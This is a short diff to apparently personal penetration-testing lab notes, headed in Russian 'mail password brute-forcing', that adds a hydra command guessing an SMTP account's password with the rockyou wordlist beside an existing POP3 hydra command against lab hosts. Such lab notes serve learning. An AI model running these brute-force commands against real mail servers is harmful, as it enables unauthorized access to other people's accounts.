@@ -8,6 +8,8 @@
 # Подбор пароля почты
 
     hydra -l 'marlin@inlanefreight.htb' -P passwords.txt -f 10.129.203.12  pop3
+    hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.62.142 -t 4 -w 10
+    
   
 # Login via Telnet port 110 pop3
 
